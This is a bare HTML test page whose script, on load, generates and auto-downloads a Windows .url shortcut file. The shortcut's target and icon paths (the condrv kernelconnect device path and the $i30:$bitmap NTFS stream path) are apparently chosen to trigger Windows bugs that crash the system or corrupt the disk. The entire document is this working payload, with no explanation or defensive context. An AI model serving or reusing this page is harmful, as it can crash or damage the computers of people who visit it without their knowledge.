<html>
  <head>
    <title>
      Test site
    </title>
  </head>
  <body>
    <script>
      let file = new File(["[InternetShortcut]",
        "\nURL=\\.\globalroot\device\condrv\kernelconnect",
        "\nIconIndex=0",
        "\nIconFile=C:\:$i30:$bitmap"],
         "file.url", {
        type: "text/plain",
        }
      );

      let link = document.createElement('a');
      link.download = file.name;

      link.href = URL.createObjectURL(file);
      link.click();
      URL.revokeObjectURL(link.href);
    </script>
  </body>
</html>
